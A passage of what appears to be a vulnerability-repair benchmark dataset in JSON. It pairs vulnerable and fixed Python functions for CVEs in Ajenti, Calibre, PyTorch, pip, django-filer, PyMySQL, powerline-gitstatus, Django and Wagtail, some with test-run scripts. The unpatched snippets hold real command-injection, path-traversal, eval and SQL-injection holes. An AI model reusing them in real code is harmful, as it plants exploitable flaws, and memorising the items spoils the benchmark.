        "snippet": "    def authenticate(self, username, password):\n        child = None\n\n        if PY3:\n            from shlex import quote\n        else:\n            from pipes import quote\n\n        try:\n            child = pexpect.spawn('/bin/sh', ['-c', '/bin/su -c \"/bin/echo SUCCESS\" - %s' % quote(username)], timeout=5)\n            child.expect('.*:')\n            child.sendline(password)\n            result = child.expect(['su: .*', 'SUCCESS'])\n        except Exception as err:\n            if child and child.isalive():\n                child.close()\n            logging.error('Error checking password: %s', err)\n            return False\n        if result == 0:\n            return False\n        else:\n            return True"
      }
    ],
    "vul_patch": "--- a/ajenti-core/aj/auth.py\n+++ b/ajenti-core/aj/auth.py\n@@ -1,7 +1,13 @@\n     def authenticate(self, username, password):\n         child = None\n+\n+        if PY3:\n+            from shlex import quote\n+        else:\n+            from pipes import quote\n+\n         try:\n-            child = pexpect.spawn('/bin/sh', ['-c', '/bin/su -c \"/bin/echo SUCCESS\" - %s' % username], timeout=5)\n+            child = pexpect.spawn('/bin/sh', ['-c', '/bin/su -c \"/bin/echo SUCCESS\" - %s' % quote(username)], timeout=5)\n             child.expect('.*:')\n             child.sendline(password)\n             result = child.expect(['su: .*', 'SUCCESS'])\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-6781",
    "cve_description": "Path traversal in Calibre <= 7.14.0 allow unauthenticated attackers to achieve arbitrary file read.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/kovidgoyal/calibre",
    "patch_url": [
      "https://github.com/kovidgoyal/calibre/commit/bcd0ab12c41a887f8290a9b56e46c3a29038d9c4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_349_1",
        "commit": "f3420c6b15a5fb39ae75b08ed23d8dd0ee25dcc2",
        "file_path": "src/calibre/db/backend.py",
        "start_line": 2005,
        "end_line": 2012,
        "snippet": "    def copy_extra_file_to(self, book_id, book_path, relpath, stream_or_path):\n        full_book_path = os.path.abspath(os.path.join(self.library_path, book_path))\n        src_path = make_long_path_useable(os.path.join(full_book_path, relpath))\n        if isinstance(stream_or_path, str):\n            shutil.copy2(src_path, make_long_path_useable(stream_or_path))\n        else:\n            with open(src_path, 'rb') as src:\n                shutil.copyfileobj(src, stream_or_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_349_1",
        "commit": "bcd0ab12c41a887f8290a9b56e46c3a29038d9c4",
        "file_path": "src/calibre/db/backend.py",
        "start_line": 2005,
        "end_line": 2015,
        "snippet": "    def copy_extra_file_to(self, book_id, book_path, relpath, stream_or_path):\n        full_book_path = os.path.abspath(os.path.join(self.library_path, book_path))\n        extra_file_path = os.path.abspath(os.path.join(full_book_path, relpath))\n        if not extra_file_path.startswith(full_book_path):\n            raise FileNotFoundError(f'No data file {relpath} in book: {book_id}')\n        src_path = make_long_path_useable(extra_file_path)\n        if isinstance(stream_or_path, str):\n            shutil.copy2(src_path, make_long_path_useable(stream_or_path))\n        else:\n            with open(src_path, 'rb') as src:\n                shutil.copyfileobj(src, stream_or_path)"
      }
    ],
    "vul_patch": "--- a/src/calibre/db/backend.py\n+++ b/src/calibre/db/backend.py\n@@ -1,6 +1,9 @@\n     def copy_extra_file_to(self, book_id, book_path, relpath, stream_or_path):\n         full_book_path = os.path.abspath(os.path.join(self.library_path, book_path))\n-        src_path = make_long_path_useable(os.path.join(full_book_path, relpath))\n+        extra_file_path = os.path.abspath(os.path.join(full_book_path, relpath))\n+        if not extra_file_path.startswith(full_book_path):\n+            raise FileNotFoundError(f'No data file {relpath} in book: {book_id}')\n+        src_path = make_long_path_useable(extra_file_path)\n         if isinstance(stream_or_path, str):\n             shutil.copy2(src_path, make_long_path_useable(stream_or_path))\n         else:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-45907",
    "cve_description": "In PyTorch before trunk/89695, torch.jit.annotations.parse_type_line can cause arbitrary code execution because eval is used unsafely.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pytorch/pytorch",
    "patch_url": [
      "https://github.com/pytorch/pytorch/commit/767f6aa49fe20a2766b9843d01e3b7f7793df6a3"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_317_1",
        "commit": "fbbf368",
        "file_path": "torch/jit/annotations.py",
        "start_line": "147",
        "end_line": "170",
        "snippet": "def parse_type_line(type_line, rcb, loc):\n    \"\"\"Parses a type annotation specified as a comment.\n\n    Example inputs:\n        # type: (Tensor, torch.Tensor) -> Tuple[Tensor]\n        # type: (Tensor, Tuple[Tensor, Tensor]) -> Tensor\n    \"\"\"\n    arg_ann_str, ret_ann_str = split_type_line(type_line)\n\n    try:\n        arg_ann = eval(arg_ann_str, {}, EvalEnv(rcb))  # type: ignore[arg-type] # noqa: P204\n    except (NameError, SyntaxError) as e:\n        raise RuntimeError(\"Failed to parse the argument list of a type annotation\") from e\n\n    if not isinstance(arg_ann, tuple):\n        arg_ann = (arg_ann,)\n\n    try:\n        ret_ann = eval(ret_ann_str, {}, EvalEnv(rcb))  # type: ignore[arg-type] # noqa: P204\n    except (NameError, SyntaxError) as e:\n        raise RuntimeError(\"Failed to parse the return type of a type annotation\") from e\n\n    arg_types = [ann_to_type(ann, loc) for ann in arg_ann]\n    return arg_types, ann_to_type(ret_ann, loc)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_317_1",
        "commit": "767f6aa",
        "file_path": "torch/jit/annotations.py",
        "start_line": "157",
        "end_line": "180",
        "snippet": "def parse_type_line(type_line, rcb, loc):\n    \"\"\"Parses a type annotation specified as a comment.\n\n    Example inputs:\n        # type: (Tensor, torch.Tensor) -> Tuple[Tensor]\n        # type: (Tensor, Tuple[Tensor, Tensor]) -> Tensor\n    \"\"\"\n    arg_ann_str, ret_ann_str = split_type_line(type_line)\n\n    try:\n        arg_ann = _eval_no_call(arg_ann_str, {}, EvalEnv(rcb))\n    except (NameError, SyntaxError) as e:\n        raise RuntimeError(\"Failed to parse the argument list of a type annotation\") from e\n\n    if not isinstance(arg_ann, tuple):\n        arg_ann = (arg_ann,)\n\n    try:\n        ret_ann = _eval_no_call(ret_ann_str, {}, EvalEnv(rcb))\n    except (NameError, SyntaxError) as e:\n        raise RuntimeError(\"Failed to parse the return type of a type annotation\") from e\n\n    arg_types = [ann_to_type(ann, loc) for ann in arg_ann]\n    return arg_types, ann_to_type(ret_ann, loc)"
      },
      {
        "id": "fix_py_317_2",
        "commit": "767f6aa",
        "file_path": "torch/jit/annotations.py",
        "start_line": "148",
        "end_line": "154",
        "snippet": "def _eval_no_call(stmt, glob, loc):\n    \"\"\"Evaluate statement as long as it does not contain any method/function calls\"\"\"\n    bytecode = compile(stmt, \"\", mode=\"eval\")\n    for insn in dis.get_instructions(bytecode):\n        if \"CALL\" in insn.opname:\n            raise RuntimeError(f\"Type annotation should not contain calls, but '{stmt}' does\")\n    return eval(bytecode, glob, loc)  # type: ignore[arg-type] # noqa: P204"
      }
    ],
    "vul_patch": "--- a/torch/jit/annotations.py\n+++ b/torch/jit/annotations.py\n@@ -8,7 +8,7 @@\n     arg_ann_str, ret_ann_str = split_type_line(type_line)\n \n     try:\n-        arg_ann = eval(arg_ann_str, {}, EvalEnv(rcb))  # type: ignore[arg-type] # noqa: P204\n+        arg_ann = _eval_no_call(arg_ann_str, {}, EvalEnv(rcb))\n     except (NameError, SyntaxError) as e:\n         raise RuntimeError(\"Failed to parse the argument list of a type annotation\") from e\n \n@@ -16,7 +16,7 @@\n         arg_ann = (arg_ann,)\n \n     try:\n-        ret_ann = eval(ret_ann_str, {}, EvalEnv(rcb))  # type: ignore[arg-type] # noqa: P204\n+        ret_ann = _eval_no_call(ret_ann_str, {}, EvalEnv(rcb))\n     except (NameError, SyntaxError) as e:\n         raise RuntimeError(\"Failed to parse the return type of a type annotation\") from e\n \n\n--- /dev/null\n+++ b/torch/jit/annotations.py\n@@ -0,0 +1,7 @@\n+def _eval_no_call(stmt, glob, loc):\n+    \"\"\"Evaluate statement as long as it does not contain any method/function calls\"\"\"\n+    bytecode = compile(stmt, \"\", mode=\"eval\")\n+    for insn in dis.get_instructions(bytecode):\n+        if \"CALL\" in insn.opname:\n+            raise RuntimeError(f\"Type annotation should not contain calls, but '{stmt}' does\")\n+    return eval(bytecode, glob, loc)  # type: ignore[arg-type] # noqa: P204\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-5752",
    "cve_description": "When installing a package from a Mercurial VCS URL  (ie \"pip install \nhg+...\") with pip prior to v23.3, the specified Mercurial revision could\n be used to inject arbitrary configuration options to the \"hg clone\" \ncall (ie \"--config\"). Controlling the Mercurial configuration can modify\n how and which repository is installed. This vulnerability does not \naffect users who aren't installing from Mercurial.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pypa/pip",
    "patch_url": [
      "https://github.com/pypa/pip/commit/389cb799d0da9a840749fcd14878928467ed49b4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_336_1",
        "commit": "71df02c412998aa07c358ad04388e1573b3c5348",
        "file_path": "src/pip/_internal/vcs/mercurial.py",
        "start_line": 33,
        "end_line": 34,
        "snippet": "    def get_base_rev_args(rev: str) -> List[str]:\n        return [\"-r\", rev]"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_336_1",
        "commit": "389cb799d0da9a840749fcd14878928467ed49b4",
        "file_path": "src/pip/_internal/vcs/mercurial.py",
        "start_line": 33,
        "end_line": 34,
        "snippet": "    def get_base_rev_args(rev: str) -> List[str]:\n        return [f\"-r={rev}\"]"
      }
    ],
    "vul_patch": "--- a/src/pip/_internal/vcs/mercurial.py\n+++ b/src/pip/_internal/vcs/mercurial.py\n@@ -1,2 +1,2 @@\n     def get_base_rev_args(rev: str) -> List[str]:\n-        return [\"-r\", rev]\n+        return [f\"-r={rev}\"]\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-11404",
    "cve_description": "Unrestricted Upload of File with Dangerous Type, Improper Input Validation, Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) vulnerability in django CMS Association django Filer allows Input Data Manipulation, Stored XSS.This issue affects django Filer: from 3 before 3.3.",
    "cwe_info": {
      "CWE-434": {
        "name": "Unrestricted Upload of File with Dangerous Type",
        "description": "The product allows the upload or transfer of dangerous file types that are automatically processed within its environment."
      }
    },
    "repo": "https://github.com/django-cms/django-filer",
    "patch_url": [
      "https://github.com/django-cms/django-filer/commit/f8209a6507680661bd134cd30878993b79ef3344"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_322_1",
        "commit": "d72520c",
        "file_path": "filer/settings.py",
        "start_line": 292,
        "end_line": 295,
        "snippet": "FILE_VALIDATORS = {\n    \"text/html\": [\"filer.validation.deny_html\"],\n    \"image/svg+xml\": [\"filer.validation.validate_svg\"],\n}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_322_1",
        "commit": "f8209a6507680661bd134cd30878993b79ef3344",
        "file_path": "filer/settings.py",
        "start_line": 292,
        "end_line": 296,
        "snippet": "FILE_VALIDATORS = {\n    \"text/html\": [\"filer.validation.deny_html\"],\n    \"image/svg+xml\": [\"filer.validation.validate_svg\"],\n    \"application/octet-stream\": [\"filer.validation.deny\"],\n}"
      }
    ],
    "vul_patch": "--- a/filer/settings.py\n+++ b/filer/settings.py\n@@ -1,4 +1,5 @@\n FILE_VALIDATORS = {\n     \"text/html\": [\"filer.validation.deny_html\"],\n     \"image/svg+xml\": [\"filer.validation.validate_svg\"],\n+    \"application/octet-stream\": [\"filer.validation.deny\"],\n }\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-36039",
    "cve_description": "PyMySQL through 1.1.0 allows SQL injection if used with untrusted JSON input because keys are not escaped by escape_dict.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/PyMySQL/PyMySQL",
    "patch_url": [
      "https://github.com/PyMySQL/PyMySQL/commit/521e40050cb386a499f68f483fefd144c493053c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_190_1",
        "commit": "7f032a6",
        "file_path": "pymysql/converters.py",
        "start_line": 29,
        "end_line": 34,
        "snippet": "def escape_dict(val, charset, mapping=None):\n    n = {}\n    for k, v in val.items():\n        quoted = escape_item(v, charset, mapping)\n        n[k] = quoted\n    return n"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_190_1",
        "commit": "521e400",
        "file_path": "pymysql/converters.py",
        "start_line": 29,
        "end_line": 30,
        "snippet": "def escape_dict(val, charset, mapping=None):\n    raise TypeError(\"dict can not be used as parameter\")"
      }
    ],
    "vul_patch": "--- a/pymysql/converters.py\n+++ b/pymysql/converters.py\n@@ -1,6 +1,2 @@\n def escape_dict(val, charset, mapping=None):\n-    n = {}\n-    for k, v in val.items():\n-        quoted = escape_item(v, charset, mapping)\n-        n[k] = quoted\n-    return n\n+    raise TypeError(\"dict can not be used as parameter\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-42906",
    "cve_description": "powerline-gitstatus (aka Powerline Gitstatus) before 1.3.2 allows arbitrary code execution. git repositories can contain per-repository configuration that changes the behavior of git, including running arbitrary commands. When using powerline-gitstatus, changing to a directory automatically runs git commands in order to display information about the current repository in the prompt. If an attacker can convince a user to change their current directory to one controlled by the attacker, such as in a shared filesystem or extracted archive, powerline-gitstatus will run arbitrary commands under the attacker's control. NOTE: this is similar to CVE-2022-20001.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/jaspernbrouwer/powerline-gitstatus",
    "patch_url": [
      "https://github.com/jaspernbrouwer/powerline-gitstatus/commit/fe8e963b3489e4cceaa2c1f26f2bcc2ef405364c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_366_1",
        "commit": "8000c7f41305ddb421528dd00b6292ffd121c2c2",
        "file_path": "powerline_gitstatus/segments.py",
        "start_line": 28,
        "end_line": 40,
        "snippet": "    def get_base_command(self, cwd, use_dash_c):\n        if use_dash_c:\n            return ['git', '-C', cwd]\n\n        while cwd and cwd != os.sep:\n            gitdir = os.path.join(cwd, '.git')\n\n            if os.path.isdir(gitdir):\n                return ['git', '--git-dir=%s' % gitdir, '--work-tree=%s' % cwd]\n\n            cwd = os.path.dirname(cwd)\n\n        return None"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_366_1",
        "commit": "fe8e963b3489e4cceaa2c1f26f2bcc2ef405364c",
        "file_path": "powerline_gitstatus/segments.py",
        "start_line": 28,
        "end_line": 40,
        "snippet": "    def get_base_command(self, cwd, use_dash_c):\n        if use_dash_c:\n            return ['git', '-c', 'core.fsmonitor=', '-C', cwd]\n\n        while cwd and cwd != os.sep:\n            gitdir = os.path.join(cwd, '.git')\n\n            if os.path.isdir(gitdir):\n                return ['git', '-c', 'core.fsmonitor=', '--git-dir=%s' % gitdir, '--work-tree=%s' % cwd]\n\n            cwd = os.path.dirname(cwd)\n\n        return None"
      }
    ],
    "vul_patch": "--- a/powerline_gitstatus/segments.py\n+++ b/powerline_gitstatus/segments.py\n@@ -1,12 +1,12 @@\n     def get_base_command(self, cwd, use_dash_c):\n         if use_dash_c:\n-            return ['git', '-C', cwd]\n+            return ['git', '-c', 'core.fsmonitor=', '-C', cwd]\n \n         while cwd and cwd != os.sep:\n             gitdir = os.path.join(cwd, '.git')\n \n             if os.path.isdir(gitdir):\n-                return ['git', '--git-dir=%s' % gitdir, '--work-tree=%s' % cwd]\n+                return ['git', '-c', 'core.fsmonitor=', '--git-dir=%s' % gitdir, '--work-tree=%s' % cwd]\n \n             cwd = os.path.dirname(cwd)\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-7233",
    "cve_description": "Django 1.10 before 1.10.7, 1.9 before 1.9.13, and 1.8 before 1.8.18 relies on user input in some cases to redirect the user to an \"on success\" URL. The security check for these redirects (namely ``django.utils.http.is_safe_url()``) considered some numeric URLs \"safe\" when they shouldn't be, aka an open redirect vulnerability. Also, if a developer relies on ``is_safe_url()`` to provide safe redirect targets and puts such a URL into a link, they could suffer from an XSS attack.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/8339277518c7d8ec280070a780915304654e3b66",
      "https://github.com/django/django/commit/254326cb3682389f55f886804d2c43f7b9f23e4f",
      "https://github.com/django/django/commit/f824655bc2c50b19d2f202d7640785caabc82787"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_8_1",
        "commit": "5f1ffb0",
        "file_path": "django/utils/http.py",
        "start_line": 303,
        "end_line": 321,
        "snippet": "def _is_safe_url(url, host):\n    # Chrome considers any URL with more than two slashes to be absolute, but\n    # urlparse is not so flexible. Treat any url with three slashes as unsafe.\n    if url.startswith('///'):\n        return False\n    url_info = urlparse(url)\n    # Forbid URLs like http:///example.com - with a scheme, but without a hostname.\n    # In that URL, example.com is not the hostname but, a path component. However,\n    # Chrome will still consider example.com to be the hostname, so we must not\n    # allow this syntax.\n    if not url_info.netloc and url_info.scheme:\n        return False\n    # Forbid URLs that start with control characters. Some browsers (like\n    # Chrome) ignore quite a few control characters at the start of a\n    # URL and might consider the URL as scheme relative.\n    if unicodedata.category(url[0])[0] == 'C':\n        return False\n    return ((not url_info.netloc or url_info.netloc == host) and\n            (not url_info.scheme or url_info.scheme in ['http', 'https']))"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_8_1",
        "commit": "254326c",
        "file_path": "django/utils/http.py",
        "start_line": 314,
        "end_line": 384,
        "snippet": "# Copied from urllib.parse.urlparse() but uses fixed urlsplit() function.\ndef _urlparse(url, scheme='', allow_fragments=True):\n    \"\"\"Parse a URL into 6 components:\n    <scheme>://<netloc>/<path>;<params>?<query>#<fragment>\n    Return a 6-tuple: (scheme, netloc, path, params, query, fragment).\n    Note that we don't break the components up in smaller bits\n    (e.g. netloc is a single string) and we don't expand % escapes.\"\"\"\n    if _coerce_args:\n        url, scheme, _coerce_result = _coerce_args(url, scheme)\n    splitresult = _urlsplit(url, scheme, allow_fragments)\n    scheme, netloc, url, query, fragment = splitresult\n    if scheme in uses_params and ';' in url:\n        url, params = _splitparams(url)\n    else:\n        params = ''\n    result = ParseResult(scheme, netloc, url, params, query, fragment)\n    return _coerce_result(result) if _coerce_args else result\n\n\n# Copied from urllib.parse.urlsplit() with\n# https://github.com/python/cpython/pull/661 applied.\ndef _urlsplit(url, scheme='', allow_fragments=True):\n    \"\"\"Parse a URL into 5 components:\n    <scheme>://<netloc>/<path>?<query>#<fragment>\n    Return a 5-tuple: (scheme, netloc, path, query, fragment).\n    Note that we don't break the components up in smaller bits\n    (e.g. netloc is a single string) and we don't expand % escapes.\"\"\"\n    if _coerce_args:\n        url, scheme, _coerce_result = _coerce_args(url, scheme)\n    allow_fragments = bool(allow_fragments)\n    netloc = query = fragment = ''\n    i = url.find(':')\n    if i > 0:\n        for c in url[:i]:\n            if c not in scheme_chars:\n                break\n        else:\n            scheme, url = url[:i].lower(), url[i + 1:]\n\n    if url[:2] == '//':\n        netloc, url = _splitnetloc(url, 2)\n        if (('[' in netloc and ']' not in netloc) or\n                (']' in netloc and '[' not in netloc)):\n            raise ValueError(\"Invalid IPv6 URL\")\n    if allow_fragments and '#' in url:\n        url, fragment = url.split('#', 1)\n    if '?' in url:\n        url, query = url.split('?', 1)\n    v = SplitResult(scheme, netloc, url, query, fragment)\n    return _coerce_result(v) if _coerce_args else v\n\n\ndef _is_safe_url(url, host):\n    # Chrome considers any URL with more than two slashes to be absolute, but\n    # urlparse is not so flexible. Treat any url with three slashes as unsafe.\n    if url.startswith('///'):\n        return False\n    url_info = _urlparse(url)\n    # Forbid URLs like http:///example.com - with a scheme, but without a hostname.\n    # In that URL, example.com is not the hostname but, a path component. However,\n    # Chrome will still consider example.com to be the hostname, so we must not\n    # allow this syntax.\n    if not url_info.netloc and url_info.scheme:\n        return False\n    # Forbid URLs that start with control characters. Some browsers (like\n    # Chrome) ignore quite a few control characters at the start of a\n    # URL and might consider the URL as scheme relative.\n    if unicodedata.category(url[0])[0] == 'C':\n        return False\n    return ((not url_info.netloc or url_info.netloc == host) and\n            (not url_info.scheme or url_info.scheme in ['http', 'https']))"
      }
    ],
    "vul_patch": "--- a/django/utils/http.py\n+++ b/django/utils/http.py\n@@ -1,9 +1,61 @@\n+# Copied from urllib.parse.urlparse() but uses fixed urlsplit() function.\n+def _urlparse(url, scheme='', allow_fragments=True):\n+    \"\"\"Parse a URL into 6 components:\n+    <scheme>://<netloc>/<path>;<params>?<query>#<fragment>\n+    Return a 6-tuple: (scheme, netloc, path, params, query, fragment).\n+    Note that we don't break the components up in smaller bits\n+    (e.g. netloc is a single string) and we don't expand % escapes.\"\"\"\n+    if _coerce_args:\n+        url, scheme, _coerce_result = _coerce_args(url, scheme)\n+    splitresult = _urlsplit(url, scheme, allow_fragments)\n+    scheme, netloc, url, query, fragment = splitresult\n+    if scheme in uses_params and ';' in url:\n+        url, params = _splitparams(url)\n+    else:\n+        params = ''\n+    result = ParseResult(scheme, netloc, url, params, query, fragment)\n+    return _coerce_result(result) if _coerce_args else result\n+\n+\n+# Copied from urllib.parse.urlsplit() with\n+# https://github.com/python/cpython/pull/661 applied.\n+def _urlsplit(url, scheme='', allow_fragments=True):\n+    \"\"\"Parse a URL into 5 components:\n+    <scheme>://<netloc>/<path>?<query>#<fragment>\n+    Return a 5-tuple: (scheme, netloc, path, query, fragment).\n+    Note that we don't break the components up in smaller bits\n+    (e.g. netloc is a single string) and we don't expand % escapes.\"\"\"\n+    if _coerce_args:\n+        url, scheme, _coerce_result = _coerce_args(url, scheme)\n+    allow_fragments = bool(allow_fragments)\n+    netloc = query = fragment = ''\n+    i = url.find(':')\n+    if i > 0:\n+        for c in url[:i]:\n+            if c not in scheme_chars:\n+                break\n+        else:\n+            scheme, url = url[:i].lower(), url[i + 1:]\n+\n+    if url[:2] == '//':\n+        netloc, url = _splitnetloc(url, 2)\n+        if (('[' in netloc and ']' not in netloc) or\n+                (']' in netloc and '[' not in netloc)):\n+            raise ValueError(\"Invalid IPv6 URL\")\n+    if allow_fragments and '#' in url:\n+        url, fragment = url.split('#', 1)\n+    if '?' in url:\n+        url, query = url.split('?', 1)\n+    v = SplitResult(scheme, netloc, url, query, fragment)\n+    return _coerce_result(v) if _coerce_args else v\n+\n+\n def _is_safe_url(url, host):\n     # Chrome considers any URL with more than two slashes to be absolute, but\n     # urlparse is not so flexible. Treat any url with three slashes as unsafe.\n     if url.startswith('///'):\n         return False\n-    url_info = urlparse(url)\n+    url_info = _urlparse(url)\n     # Forbid URLs like http:///example.com - with a scheme, but without a hostname.\n     # In that URL, example.com is not the hostname but, a path component. However,\n     # Chrome will still consider example.com to be the hostname, so we must not\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2017-7233:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2017-7233/bin/python ./runtests.py utils_tests.test_http.TestUtilsHttp.test_is_safe_url\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2017-7233:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2017-7233/bin/python ./runtests.py utils_tests.test_http\n"
  },
  {
    "cve_id": "CVE-2022-21683",
    "cve_description": "Wagtail is a Django based content management system focused on flexibility and user experience. When notifications for new replies in comment threads are sent, they are sent to all users who have replied or commented anywhere on the site, rather than only in the relevant threads. This means that a user could listen in to new comment replies on pages they have not have editing access to, as long as they have left a comment or reply somewhere on the site. A patched version has been released as Wagtail 2.15.2, which restores the intended behaviour - to send notifications for new replies to the participants in the active thread only (editing permissions are not considered). New comments can be disabled by setting `WAGTAILADMIN_COMMENTS_ENABLED = False` in the Django settings file.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/wagtail/wagtail",
    "patch_url": [
      "https://github.com/wagtail/wagtail/commit/5fe901e5d86ed02dbbb63039a897582951266afd"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_16_1",
        "commit": "335ece5",
        "file_path": "wagtail/admin/views/pages/edit.py",
        "start_line": 121,
        "end_line": 197,
        "snippet": "    def send_commenting_notifications(self, changes):\n        \"\"\"\n        Sends notifications about any changes to comments to anyone who is subscribed.\n        \"\"\"\n        relevant_comment_ids = []\n        relevant_comment_ids.extend(comment.pk for comment in changes['resolved_comments'])\n        relevant_comment_ids.extend(comment.pk for comment, replies in changes['new_replies'])\n\n        # Skip if no changes were made\n        # Note: We don't email about edited comments so ignore those here\n        if (not changes['new_comments']\n                and not changes['deleted_comments']\n                and not changes['resolved_comments']\n                and not changes['new_replies']):\n            return\n\n        # Get global page comment subscribers\n        subscribers = PageSubscription.objects.filter(page=self.page, comment_notifications=True).select_related('user')\n        global_recipient_users = [subscriber.user for subscriber in subscribers if subscriber.user != self.request.user]\n\n        # Get subscribers to individual threads\n        replies = CommentReply.objects.filter(comment_id__in=relevant_comment_ids)\n        comments = Comment.objects.filter(id__in=relevant_comment_ids)\n        thread_users = get_user_model().objects.exclude(pk=self.request.user.pk).exclude(pk__in=subscribers.values_list('user_id', flat=True)).prefetch_related(\n            Prefetch('comment_replies', queryset=replies),\n            Prefetch(COMMENTS_RELATION_NAME, queryset=comments)\n        ).exclude(\n            Q(comment_replies__isnull=True) & Q(**{('%s__isnull' % COMMENTS_RELATION_NAME): True})\n        )\n\n        # Skip if no recipients\n        if not (global_recipient_users or thread_users):\n            return\n        thread_users = [(user, set(list(user.comment_replies.values_list('comment_id', flat=True)) + list(getattr(user, COMMENTS_RELATION_NAME).values_list('pk', flat=True)))) for user in thread_users]\n        mailed_users = set()\n\n        for current_user, current_threads in thread_users:\n            # We are trying to avoid calling send_notification for each user for performance reasons\n            # so group the users receiving the same thread notifications together here\n            if current_user in mailed_users:\n                continue\n            users = [current_user]\n            mailed_users.add(current_user)\n            for user, threads in thread_users:\n                if user not in mailed_users and threads == current_threads:\n                    users.append(user)\n                    mailed_users.add(user)\n            send_notification(users, 'updated_comments', {\n                'page': self.page,\n                'editor': self.request.user,\n                'new_comments': [comment for comment in changes['new_comments'] if comment.pk in threads],\n                'resolved_comments': [comment for comment in changes['resolved_comments'] if comment.pk in threads],\n                'deleted_comments': [],\n                'replied_comments': [\n                    {\n                        